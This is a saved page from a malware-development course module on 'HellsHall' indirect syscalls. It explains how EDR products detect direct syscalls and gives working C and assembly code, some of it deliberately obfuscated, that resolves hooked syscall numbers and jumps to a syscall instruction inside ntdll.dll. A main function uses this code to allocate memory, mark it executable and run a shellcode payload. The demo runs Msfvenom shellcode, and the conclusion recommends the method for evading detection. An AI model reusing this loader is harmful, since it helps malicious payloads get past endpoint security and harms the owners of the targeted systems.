<!DOCTYPE html>
<html class="dark"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <meta name="csrf-token" content="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">
        <link rel="stylesheet" href="Indirect%20Syscalls%20-%20HellsHall_files/template.css">
        <link rel="shortcut icon" href="https://maldevacademy.com/favicon.ico">
        <!-- fontawesome for icons -->
        <link rel="stylesheet" href="Indirect%20Syscalls%20-%20HellsHall_files/font-awesome.min.css">
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="Indirect%20Syscalls%20-%20HellsHall_files/css2.css" rel="stylesheet">
        <link href="Indirect%20Syscalls%20-%20HellsHall_files/css2_002.css" rel="stylesheet">
        <title>Indirect Syscalls - HellsHall</title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="Indirect%20Syscalls%20-%20HellsHall_files/app.fdbb573b.css"><link rel="stylesheet" href="Indirect%20Syscalls%20-%20HellsHall_files/app.fdbb573b.css"><link rel="stylesheet" href="Indirect%20Syscalls%20-%20HellsHall_files/viewer.css">
    </head>
    <body>
        <nav id="navbar" class="px-2 sm:px-4 py-2.5 bg-gray-900 sticky hidden">
    <div class="container flex flex-wrap justify-between mx-auto">
      <a data-target="_self" href="https://maldevacademy.com/" class="flex items-center">
        <div class="main-logo flex flex-row items-center">
            <span class="text-xl logo-font text-white">MALDEV</span>
            <img class="w-[25px] mx-2 relative bottom-1" src="Indirect%20Syscalls%20-%20HellsHall_files/logo-bug-2.png" alt="Logo">   
            <span class="text-xl logo-font text-white">ACADEMY</span>          
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 bg-gray-50 rounded-lg border border-gray-100 md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 md:bg-white dark:bg-gray-800 md:dark:bg-gray-900 dark:border-gray-700">
          <li>
            <a data-target="_self" href="https://maldevacademy.com/" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>
          <li>
            <a data-target="_self" href="https://maldevacademy.com/faq" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">FAQ</a>
          </li>
          <li>
            <a data-target="_self" href="https://maldevacademy.com/syllabus" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Syllabus</a>
          </li>
                              <li>
            <a data-target="_self" href="https://maldevacademy.com/pricing" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Pricing</a>
          </li>
                                        <li>
            <a data-target="_self" href="https://maldevacademy.com/profile" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Profile</a>
          </li>
          <li>
            <form action="https://maldevacademy.com/logout" method="POST">
            <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">              <button type="submit" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Logout</button>
            </form>
          </li>
          <li class="mt-4 md:mt-0">
            <a data-target="_self" href="https://maldevacademy.com/modules" class="text-white bg-blue-700 hover:bg-blue-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">Modules</a>
          </li>
                  </ul>
      </div>
    </div>
  </nav>        <div class="bg-gray-900 p-4">
    <div class="flex">
        <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700 border-l border-t border-gray-600 pl-4 pt-2 pb-2 rounded-tl">
            <div>
                Module 89 - Indirect Syscalls - HellsHall
            </div>
            <div class="ml-2 w-4 h-4 bg-red-600 rounded-full"></div>
        </div>
        <div class="flex justify-end items-center w-1/2 bg-gray-700 pr-4 pt-2 pb-2 rounded-tr border-t border-r border-gray-600">
            <div class="enlarge-container pr-4">
                <img src="Indirect%20Syscalls%20-%20HellsHall_files/enlarge.svg" onclick="toggleScreenWidth()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="enlargeToggle" alt="Screen Width" width="20px">
            </div>
            <div class="objectives-container pr-4">
                <img src="Indirect%20Syscalls%20-%20HellsHall_files/objectives.svg" onclick="toggleObjectives()" class="hover:bg-gray-600 cursor-pointer" id="objectivesToggle" alt="Objectives" width="20px">
            </div>
            <div class="terminal-container  pr-4 ">
                <img src="Indirect%20Syscalls%20-%20HellsHall_files/ide.svg" onclick="toggleIde()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="terminalToggle" alt="Terminal" width="22px">
            </div>
                                    <div class="dl-container">
                <a href="https://maldevacademy.com/download/file/HellsHall" target="_blank">
                    <img src="Indirect%20Syscalls%20-%20HellsHall_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" alt="Download" width="20px">
                </a>
            </div>
                                </div>
    </div>
    <div id="height-container" class="flex h-full min-h-[800px]">
        <div class="flex max-w-full min-w-full">
            <div id="description-container" class="viewer code-description h-full bg-gray-800 p-4 border-r border-l border-b border-gray-600 px-5 md:px-10 lg:px-20 w-full"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">
            <h2>Indirect Syscalls - HellsHall</h2>
<h3>Introduction</h3>
<p>The Hell's Gate implementation was updated in the previous module to 
improve its ability to obtain the SSN of any hooked syscall. 
Unfortunately, the implementation still relied on direct syscalls where 
the syscall function is executed from within the address space of the 
local process rather than where it's supposed to be executed from, <code>ntdll.dll</code>.
 Direct syscalls can be detected by EDRs and other security solutions 
due to the use of callbacks that are triggered when the program flow is 
transferred between user and kernel mode or vice versa which is when the
 <code>syscall</code> is executed or returned. Recall that the <code>syscall</code> instruction in 64-bit assembly is used to switch the processor from user mode to kernel mode and initiate a system call.</p>
<p>For example, if a security solution uses <a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FProcess%2FNtSetInformationProcess.html" target="_blank">NtSetProcessInformation</a> with the <code>ProcessInstrumentationCallback</code>
 flag, it can set a callback function to be executed whenever the 
execution flow returns to user mode from the kernel. The triggered 
callback function can then analyze whether the syscall executed came 
from <code>ntdll.dll</code>'s address space or not. More on detecting syscalls can be found <a href="https://mez0.cc/posts/detecting-syscalls-with-fennec/" target="_blank">here</a>.</p>
<p>Essentially if the <code>syscall</code> instruction is executed 
directly from within an assembly file, it can be detected and flagged as
 suspicious, regardless of which syscall function was used, since the <code>syscall</code> instruction should only ever be executed from within <code>ntdll.dll</code>. To circumvent this, an indirect syscall technique must be used which requires jumping to an address of a <code>syscall</code> instruction located within ntdll.dll. When security solutions trigger the callback function they would see that the <code>syscall</code> instruction was being called from within <code>ntdll.dll</code>'s address space and assume it's legitimate, although it was performed by the local program.</p>
<p>The following image illustrates how indirect syscalls are performed.</p>
<p><img src="Indirect%20Syscalls%20-%20HellsHall_files/indirect-syscalls-119305197-c35a0c2c-fc29-4153-ada5-aa88d131.png" alt="image"></p>
<h3>Finding a Syscall Address</h3>
<p>The same code from the previous module will continue to be used, as 
the SSN of a specified syscall is still necessary to execute indirect 
syscalls. The only difference will be in the assembly functions, where 
the <code>syscall</code> instruction needs to be replaced with a <code>jmp</code> instruction. The <code>jmp</code> instruction will require an address to jump to, which as mentioned previously, will be located inside <code>ntdll.dll</code> and therefore the address must be first retrieved.</p>
<p>Any valid <code>syscall</code> instruction address can be used but 
it's preferred that the instruction belongs to a different syscall than 
the one being called. For example, if <code>NtAllocateVirtualMemory</code> is being called, it is better to jump to a <code>syscall</code> instruction address that does not belong to <code>NtAllocateVirtualMemory</code> in memory.</p>
<p>Therefore instead of jumping to <code>NtAllocateVirtualMemory</code>'s syscall instruction address, <code>0x0007FF8308E3E82</code>, instead jump to <code>0x0007FF8308E3EE2</code> which is the address of <code>ZwWriteFileGather</code>'s <code>syscall</code> instruction.</p>
<p><img src="Indirect%20Syscalls%20-%20HellsHall_files/indirect-syscalls-219308096-e7b35871-ecc6-4b5a-9bf4-b7c33360.png" alt="image"></p>
<h4>Updating The NT_SYSCALL Structure</h4>
<p>To do this, the newly introduced <code>NT_SYSCALL</code> structure will now contain a new member, <code>pSyscallInstAddress</code>. This member holds the address of a random <code>syscall</code> instruction in NTDLL.</p>
<pre><code>typedef struct _NT_SYSCALL
{
    DWORD dwSSn;                    // syscall number
    DWORD dwSyscallHash;            // syscall hash value
    PVOID pSyscallAddress;          // syscall address
    PVOID pSyscallInstAddress;      // address of a random 'syscall' instruction in ntdll    

}NT_SYSCALL, * PNT_SYSCALL;
</code></pre>
<h4>Updating FetchNtSyscall</h4>
<p>The next step is to modify the <code>FetchNtSyscall</code> function to search for the <code>syscall</code> instruction address. The updated code performs the following:</p>
<ul>
<li>
<p>Checks if the syscall's address is successfully retrieved.</p>
</li>
<li>
<p>Add <code>0xFF</code> or 225 bytes (in decimal) to the address of the syscall function to search for a <code>syscall</code> instruction. The reason 225 bytes are added to the syscall function's address is to search for the <code>syscall</code>
 instruction in a random function that is 225 bytes away from the 
initial syscall. Keep in mind that the value of 225 is completely 
arbitrary and could be replaced with any other value.</p>
</li>
<li>
<p>Initiates a for-loop that searches for the opcodes <code>0x0f</code> and <code>0x05</code> which represent the <code>syscall</code> instruction.</p>
</li>
<li>
<p>The search boundary is <code>RANGE</code> which is 225, meaning that this for-loop can search 225 bytes for the <code>syscall</code> instruction.</p>
</li>
<li>
<p>When a match is found, <code>pSyscallInstAddress</code> is set to the address of the retrieved <code>syscall</code> instruction.</p>
</li>
</ul>
<pre><code>BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys) {

    // initialize ntdll config if not found
    if (!g_NtdllConf.uModule) {
        if (!InitNtdllConfigStructure())
            return FALSE;
    }

    if (dwSysHash != NULL)
        pNtSys-&gt;dwSyscallHash = dwSysHash;
    else
        return FALSE;

    for (size_t i = 0; i &lt; g_NtdllConf.dwNumberOfNames; i++) {

        PCHAR pcFuncName    = (PCHAR)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfNames[i]);
        PVOID pFuncAddress  = (PVOID)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfAddresses[g_NtdllConf.pwArrayOfOrdinals[i]]);

        // if syscall found
        if (HASH(pcFuncName) == dwSysHash) {

            pNtSys-&gt;pSyscallAddress = pFuncAddress;

            if (*((PBYTE)pFuncAddress) == 0x4C
                &amp;&amp; *((PBYTE)pFuncAddress + 1) == 0x8B
                &amp;&amp; *((PBYTE)pFuncAddress + 2) == 0xD1
                &amp;&amp; *((PBYTE)pFuncAddress + 3) == 0xB8
                &amp;&amp; *((PBYTE)pFuncAddress + 6) == 0x00
                &amp;&amp; *((PBYTE)pFuncAddress + 7) == 0x00) {

                BYTE high = *((PBYTE)pFuncAddress + 5);
                BYTE low = *((PBYTE)pFuncAddress + 4);
                pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low;
                break; // break for-loop [i]
            }

            // if hooked - scenario 1
            if (*((PBYTE)pFuncAddress) == 0xE9) {

                for (WORD idx = 1; idx &lt;= RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low - idx;
                        break; // break for-loop [idx]
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low + idx;
                        break; // break for-loop [idx]
                    }
                }
            }

            // if hooked - scenario 2
            if (*((PBYTE)pFuncAddress + 3) == 0xE9) {

                for (WORD idx = 1; idx &lt;= RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low - idx;
                        break; // break for-loop [idx]
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low + idx;
                        break; // break for-loop [idx]
                    }
                }
            }

            break; // break for-loop [i]
        }

    }

//-----------------------------------------------------------------------------------------------------------------------
// updated part //

    if (!pNtSys-&gt;pSyscallAddress)
        return FALSE;

    // looking somewhere random (0xFF byte away from the syscall address)
    ULONG_PTR uFuncAddress = (ULONG_PTR)pNtSys-&gt;pSyscallAddress + 0xFF;

    // getting the 'syscall' instruction of another syscall function
    for (DWORD z = 0, x = 1; z &lt;= RANGE; z++, x++) {
        if (*((PBYTE)uFuncAddress + z) == 0x0F &amp;&amp; *((PBYTE)uFuncAddress + x) == 0x05) {
            pNtSys-&gt;pSyscallInstAddress = ((ULONG_PTR)uFuncAddress + z);
            break; // break for-loop [x &amp; z]
        }
    }
    
//-----------------------------------------------------------------------------------------------------------------------

    if (pNtSys-&gt;dwSSn != NULL &amp;&amp; pNtSys-&gt;pSyscallAddress != NULL &amp;&amp; pNtSys-&gt;dwSyscallHash != NULL &amp;&amp; pNtSys-&gt;pSyscallInstAddress != NULL)
        return TRUE;
    else
        return FALSE;

}
</code></pre>
<h3>Updating SetSSn And RunSyscall</h3>
<p>Recall the updated assembly functions in the previous module, <code>SetSSn</code> and <code>RunSyscall</code>. Both functions were used to initiate a syscall in the updated Hell's Gate implementation.</p>
<p>Previously, <code>SetSSn</code> only required the SSN of the syscall to be called and then used <code>RunSyscall</code> to execute it. Now, <code>SetSSn</code> requires another value, <code>qSyscallInsAdress</code>, which is the address of the <code>syscall</code> instruction to jump to. After <code>SetSSn</code> initializes these values, <code>RunSyscall</code> will execute them.</p>
<h4>Unobfuscated Assembly Functions</h4>
<p><code>SetSSN</code> &amp; <code>RunSyscall</code> without unnecessary assembly instructions.</p>
<pre><code>.data

  wSystemCall       DWORD	0h	
  qSyscallInsAdress QWORD	0h	

.code

  SetSSn PROC
      mov wSystemCall, 0h
      mov qSyscallInsAdress, 0h
      mov wSystemCall, ecx		; saving the ssn value to wSystemCall
      mov qSyscallInsAdress, rdx	; saving the syscall instruction address to qSyscallInsAdress	
      ret
  SetSSn ENDP
  
  RunSyscall PROC
      mov r10, rcx
      mov eax, wSystemCall		
      jmp qword ptr [qSyscallInsAdress]	; jumping to qSyscallInsAdress instead of calling 'syscall'
      ret
  RunSyscall ENDP

end
</code></pre>
<h4>Obfuscated Assembly Functions</h4>
<p><code>SetSSN</code> &amp; <code>RunSyscall</code> with added assembly instructions.</p>
<pre><code>.data
	wSystemCall         DWORD	0h	
	qSyscallInsAdress   QWORD	0h	


.code

        SetSSn proc	
		xor eax, eax                          ; eax = 0
		mov wSystemCall, eax                  ; wSystemCall = 0
		mov qSyscallInsAdress, rax            ; qSyscallInsAdress = 0
		mov eax, ecx                          ; eax = ssn
		mov wSystemCall, eax                  ; wSystemCall = eax = ssn
		mov r8, rdx                           ; r8 = AddressOfASyscallInst
		mov qSyscallInsAdress, r8             ; qSyscallInsAdress = r8 = AddressOfASyscallInst
		ret
        SetSSn endp
  
  
        RunSyscall proc
		xor r10, r10                          ; r10 = 0
		mov rax, rcx                          ; rax = rcx
		mov r10, rax                          ; r10 = rax = rcx
		mov eax, wSystemCall                  ; eax = ssn
		jmp Run                               ; execute 'Run'
		xor eax, eax      ; wont run
		xor rcx, rcx      ; wont run
		shl r10, 2        ; wont run
	Run:
		jmp qword ptr [qSyscallInsAdress]   ; jumping to the 'syscall' instruction
		xor r10, r10                        ; r10 = 0
		mov qSyscallInsAdress, r10          ; qSyscallInsAdress = 0
		ret
      RunSyscall endp

end
</code></pre>
<h4>Creating a Helper Macro</h4>
<p>As mentioned, the <code>SetSSn</code> function now requires two parameters from the initialized <code>NT_SYSCALL</code> structure, which are <code>NT_SYSCALL.dwSSn</code> and <code>NT_SYSCALL.pSyscallInstAddress</code>. To invoke the <code>SetSSn</code> function more easily, the <code>SET_SYSCALL</code> macro is created and shown below.</p>
<pre><code>#define SET_SYSCALL(NtSys)(SetSSn((DWORD)NtSys.dwSSn,(PVOID)NtSys.pSyscallInstAddress))
</code></pre>
<p><code>SET_SYSCALL</code> takes an <code>NT_SYSCALL</code> structure and calls the <code>SetSSn</code> function, making the code neater. For example, the following snippets show <code>SetSSn</code> being called directly versus when using the <code>SET_SYSCALL</code> macro.</p>
<p><strong>Direct SetSSn Call</strong></p>
<pre><code>  NT_SYSCALL NtAllocateVirtualMemory = { 0 };
  FetchNtSyscall(NtAllocateVirtualMemory_Hash, &amp;NtAllocateVirtualMemory);
  
  SetSSn(NtAllocateVirtualMemory.dwSSn, NtAllocateVirtualMemory.pSyscallInstAddress);
  RunSyscall(/* NtAllocateVirtualMemory's parameters */);
</code></pre>
<p><strong>Using SET_SYSCALL</strong></p>
<pre><code>  NT_SYSCALL NtAllocateVirtualMemory = { 0 };
  FetchNtSyscall(NtAllocateVirtualMemory_Hash, &amp;NtAllocateVirtualMemory);
  
  SET_SYSCALL(NtAllocateVirtualMemory);
  RunSyscall(/* NtAllocateVirtualMemory's parameters */);
</code></pre>
<h3>Updating Main Function</h3>
<h4>Initializing The NTAPI_FUNC Structure</h4>
<p>Similarly to the previous module, all the invoked syscalls will be saved in a global <code>NTAPI_FUNC</code> structure.</p>
<pre><code>typedef struct _NTAPI_FUNC
{
	NT_SYSCALL	NtAllocateVirtualMemory;
	NT_SYSCALL	NtProtectVirtualMemory;
	NT_SYSCALL	NtCreateThreadEx;
	NT_SYSCALL	NtWaitForSingleObject;

}NTAPI_FUNC, *PNTAPI_FUNC;

// global variable
NTAPI_FUNC g_Nt = { 0 };
</code></pre>
<h4>Creating InitializeNtSyscalls</h4>
<p>To populate the <code>g_Nt</code> global variable, the newly created function, <code>InitializeNtSyscalls</code>, will call <code>FetchNtSyscall</code> to initialize all members of <code>NTAPI_FUNC</code>.</p>
<pre><code>BOOL InitializeNtSyscalls() {

	if (!FetchNtSyscall(NtAllocateVirtualMemory_CRC32, &amp;g_Nt.NtAllocateVirtualMemory)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtAllocateVirtualMemory \n");
		return FALSE;
	}
	printf("[+] Syscall Number Of NtAllocateVirtualMemory Is : 0x%0.2X \n\t\t&gt;&gt; Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtAllocateVirtualMemory.dwSSn, g_Nt.NtAllocateVirtualMemory.pSyscallInstAddress);


	if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, &amp;g_Nt.NtProtectVirtualMemory)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtProtectVirtualMemory \n");
		return FALSE;
	}
	printf("[+] Syscall Number Of NtProtectVirtualMemory Is : 0x%0.2X \n\t\t&gt;&gt; Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtProtectVirtualMemory.dwSSn, g_Nt.NtProtectVirtualMemory.pSyscallInstAddress);


	if (!FetchNtSyscall(NtCreateThreadEx_CRC32, &amp;g_Nt.NtCreateThreadEx)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtCreateThreadEx \n");
		return FALSE;
	}
	printf("[+] Syscall Number Of NtCreateThreadEx Is : 0x%0.2X \n\t\t&gt;&gt; Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtCreateThreadEx.dwSSn, g_Nt.NtCreateThreadEx.pSyscallInstAddress);


	if (!FetchNtSyscall(NtWaitForSingleObject_CRC32, &amp;g_Nt.NtWaitForSingleObject)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtWaitForSingleObject \n");
		return FALSE;
	}
	printf("[+] Syscall Number Of NtWaitForSingleObject Is : 0x%0.2X \n\t\t&gt;&gt; Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtWaitForSingleObject.dwSSn, g_Nt.NtWaitForSingleObject.pSyscallInstAddress);

	return TRUE;
}
</code></pre>
<h4>Main Function</h4>
<pre><code>
int main() {

	NTSTATUS	STATUS		= NULL;
	PVOID		pAddress	= NULL;
	SIZE_T		sSize		= sizeof(Payload);
	DWORD		dwOld		= NULL;
	HANDLE		hProcess	= (HANDLE)-1,	// local process
		        hThread		= NULL;
	


	// initializing the used syscalls
	if (!InitializeNtSyscalls()) {
		printf("[!] Failed To Initialize The Specified Indirect-Syscalls \n");
		return -1;
	}


	// allocating memory
	SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
	if ((STATUS = RunSyscall(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x00 || pAddress == NULL) {
		printf("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
		return -1;
	}
	

	// copying the payload
	memcpy(pAddress, Payload, sizeof(Payload));
	sSize = sizeof(Payload);


	// changing memory protection
	SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
	if ((STATUS = RunSyscall(hProcess, &amp;pAddress, &amp;sSize, PAGE_EXECUTE_READ, &amp;dwOld)) != 0x00) {
		printf("[!] NtProtectVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
		return -1;
	}


	// executing the payload
	SET_SYSCALL(g_Nt.NtCreateThreadEx);
	if ((STATUS = RunSyscall(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x00) {
		printf("[!] NtCreateThreadEx Failed With Status : 0x%0.8X\n", STATUS);
		return -1;
	}


	// waiting for the payload
	SET_SYSCALL(g_Nt.NtWaitForSingleObject);
	if ((STATUS = RunSyscall(hThread, FALSE, NULL)) != 0x00) {
		printf("[!] NtWaitForSingleObject Failed With Error: 0x%0.8X \n", STATUS);
		return -1;
	}


	printf("[#] Press &lt;Enter&gt; To Quit ... ");
	getchar();

	return 0;
}
</code></pre>
<br>
<h3>Demo</h3>
<ul>
<li>Running the HellsHall implementation while attached to xdbg.</li>
</ul>
<p><img src="Indirect%20Syscalls%20-%20HellsHall_files/indirect-syscalls-319330695-e31df2e8-be16-4b00-a1b7-81fd36bf.png" alt="image"></p>
<br>
<ul>
<li>
<code>NtAllocateVirtualMemory</code> is using <code>NtReleaseMutant</code>'s <code>syscall</code> instruction which is at address <code>0x00007FF8308E3F82</code>. A breakpoint is placed at this address, in order to track code execution.</li>
</ul>
<p><img src="Indirect%20Syscalls%20-%20HellsHall_files/indirect-syscalls-419334075-bc9f1b1c-0c8c-49e4-988d-153d35a7.png" alt="image"></p>
<br>
<ul>
<li>
<code>NtProtectVirtualMemory</code> is using <code>NtReleaseMutant</code>'s <code>syscall</code> instruction which is at address <code>0x00007FF8308E4682</code>. Again, a breakpoint is placed at this address, in order to track code execution.</li>
</ul>
<p><img src="Indirect%20Syscalls%20-%20HellsHall_files/indirect-syscalls-519334085-48c45634-cf64-478d-9091-932eb275.png" alt="image"></p>
<br>
<ul>
<li>Executing <code>NtAllocateVirtualMemory</code> triggers the breakpoint and shows that the <code>syscall</code> instruction is executed from within <code>ntdll.dll</code>.</li>
</ul>
<p><img src="Indirect%20Syscalls%20-%20HellsHall_files/indirect-syscalls-619334089-413a5cbd-32fb-457b-8546-6f5f2036.png" alt="image"></p>
<br>
<ul>
<li>Executing <code>NtProtectVirtualMemory</code> triggers the breakpoint and shows that the <code>syscall</code> instruction is executed from within <code>ntdll.dll</code>.</li>
</ul>
<p><img src="Indirect%20Syscalls%20-%20HellsHall_files/indirect-syscalls-719334094-24709fd0-3009-44af-bef7-acf53e0c.png" alt="image"></p>
<br>
<ul>
<li>Finally, the payload executes the Msfvenom shellcode.</li>
</ul>
<p><img src="Indirect%20Syscalls%20-%20HellsHall_files/indirect-syscalls-819334105-80f7d3a7-1de2-45bd-81e3-e2703efd.png" alt="w5"></p>
<br>
<h3>Conclusion</h3>
<p>The best approach is to use the implementation of HellsHall in order 
to evade detection due to direct syscalls being detected with security 
solutions. To further enhance evasion capabilities, it is recommended to
 unhook <code>ntdll.dll</code> using HellsHall, as this will ensure that payloads that trigger hooked functions can run unhooked.</p>
<p>Note that a public version of HellsHall exists on <a href="https://github.com/Maldev-Academy/HellHall" target="_blank">GitHub</a> but lacks several features. The one explained in this module contains far more features.</p>

            </div></div>
            <div id="accessory-container" class="hidden flex flex-col w-1/4 min-w-1/4 h-full">
                <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-1/2">
                    <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                        
                                                                        
            <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Understand how EDRs detect direct syscalls</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Understand how indirect syscalls work and how they're implemented in this module</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-2" data-objective-id="2" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Use HellsHall to reimplement mapping injection technique</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-3" data-objective-id="3" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Use the rand() function to output a number between 100-200 instead of having a hardcoded 225 offset</label>
                            </div>
                                                                                  
                </div>
                <div id="ide" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-1/2">
                    <textarea class="bg-gray-900 outline-0 w-full h-full resize-none font-sans" placeholder="Write temporary notes or code here"></textarea>
                </div>
            </div>  
        </div>
      </div>
      <div class="flex">
